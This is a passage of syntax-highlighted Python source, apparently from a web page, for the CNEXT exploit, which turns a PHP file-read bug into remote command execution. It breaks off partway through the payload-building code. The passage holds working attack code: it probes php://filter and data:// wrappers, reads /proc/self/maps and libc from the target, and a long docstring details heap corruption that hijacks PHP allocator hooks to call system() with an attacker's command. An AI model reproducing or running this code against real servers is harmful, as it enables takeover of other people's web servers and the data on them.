    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.
        """</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> path<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        
    <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.
        """</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        <span class="token comment"># 匹配语句记得根据题目环境更改</span>
        <span class="token comment"># data = response.re.search(b"(.*)", flags=re.S).group(1)</span>
        data <span class="token operator">=</span> response<span class="token punctuation">.</span>text
        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@entry</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>
    <span class="token string">"pad"</span><span class="token punctuation">,</span>
    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>
    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>

    url<span class="token punctuation">:</span> <span class="token builtin">str</span>
    command<span class="token punctuation">:</span> <span class="token builtin">str</span>
    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>
    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>
    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>

    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """</span>
        
        <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>
                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>
            

        <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result

        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
        
        result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>
            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>
            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>

        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>

        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>

        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>

        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>

        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>

        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>
        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>
        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>
            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>
        <span class="token punctuation">)</span>
        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>
                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>
                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    path <span class="token operator">=</span> <span class="token string">""</span>
                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>
                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>
                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> regions

    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>
        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>

        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>

        <span class="token comment"># PHP's heap</span>

        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>

        <span class="token comment"># Libc</span>

        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start

    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>
        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> region

    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>
        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>
        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>
        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>
        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>
        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>
            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>
            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>
            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>
            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE
            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"[anon:zend_alloc]"</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>

        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>
            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> first

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0\n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(&lt;chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """</span>

        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>
        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>
        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>
        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>

        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>
        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>
        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>

        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>

        CS <span class="token operator">=</span> <span class="token number">0x100</span>

        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>
        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>
        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size
        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>
        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>
        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>
        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>

        step1_size <span class="token operator">=</span> <span class="token number">1</span>
        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size
        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>
        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>
        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>
        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>

        <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>
        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>

        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>
        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>
        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>
        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>

        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>
        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>
        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>
        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>

        step3_size <span class="token operator">=</span> CS

